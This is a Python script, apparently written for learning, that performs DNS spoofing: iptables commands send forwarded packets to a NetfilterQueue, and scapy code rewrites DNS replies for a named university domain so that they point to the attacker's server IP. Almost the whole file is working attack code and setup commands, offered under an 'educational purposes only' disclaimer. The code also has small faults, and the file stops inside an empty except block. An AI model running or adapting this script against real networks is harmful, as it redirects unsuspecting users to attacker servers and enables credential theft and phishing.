'''
Created on 27 Aug 2021

@author: adam
'''
# DNS spoofing will not work on HTTPS servers as they are TLS encrypted
# and will only work on HTTP servers.
    # most web sites are now TLS encrypted.
    # Therfore this script is for educational purposes only 
    
# This script is intended for use on linux

# Netfliterque must be instaled:
# NetfilterQueue library provides access to packets matched by an iptables rule in Linux 
#     pip3 install netfilterqueue scapy / if using python3
#     pip2 install netfilterqueue scapy / if using python2

# IPtable rules will need to be modified befor running this script
    # These rule indicates that whenever a packet is forwarded, 
    # redirect it ( -j for jump ) to the netfilter queue number 0.
    # queue number is set in function nfqueue.bind(0, process_packet) on line 104 
    # This will enable us to redirect all the forwarded packets into Python. 

# Commands to add new rule to IPtables:  
    # $ sudo iptables --flush 
    # $ sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
    # $ sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
    # $ sudo iptables -I INPUT -j NFQUEUE --queue-num 0
    
# Other usful IPtable commands:
    # Listing the iptables rules in the table view
    # $ sudo iptables -L
    
    # Flush will delete all rules in IPtables 
    # $ sudo iptables --flush 
    

# !/usr/bin/python    

# May not work in python 3 may need to use python 2 shebang
# !/usr/bin/env python2.7



from scapy.all import * 
from netfilterqueue import NetfilterQueue

# delete checksums and length of packet
def del_fields(pkt):
    #delete lenght field from pkt
    del pkt[scapy.IP].len
    #delete checksum field from pkt
    del pkt[scapy.IP].chksum
    
    #delete the same fields from UDP 
    del pkt[scapy.UDP].len
    del pkt[scapy.UDP].chksum
    
    return pkt
    
    
def process_packet(packet):
    # convert netfilter queue packet to scapy packet
        #converts the raw packet to a scapy compatible string
    pkt = scapy.IP(packet.get_payload()) 

    # if the packet is a DNS Resource Record (DNS reply)
    if pkt.haslayer(scapy.DNSRR):
        
        # get the DNS query name, the domain name
        qname = pkt[scapy.DNSQR].qname
        
        #check to see if website query name matches
        if "arh.bg.ac.rs" in qname:
            
            #set awnser as new DNS reply. With rrname set as same 
            #as original DNS request BUT! rdata to our server ip  
            answer = scapy.DNSRR(rrname=qname, rdata="192.168....")
            
            # modify pkt with our veriables answer and accout.
                # ancount is modifide as web site could have multiple servers 
                # leading to more the one way of gaining access to the site 
                # we reduce this to just one 
            pkt[scapy.DNS].an = answer
            pkt[scapy.DNS].ancount = 1
            
            
            # delete checksums and length of packet, because we have modified the packet
            pkt = del_fields(pkt)
            
            
                        
            # set the packet content to our modified version.
                # NOTE this modifies the packet passed in to out process_packet()
                # function on line 62 
            packet.set_payload(str(pkt))
            
    packet.accept() #accept the packet
    
    

nfqueue = NetfilterQueue()
#0 is the iptabels rule queue number, modify is the callback function
nfqueue.bind(0, process_packet) 


try:
    nfqueue.run()
except KeyboardInterrupt:
    
    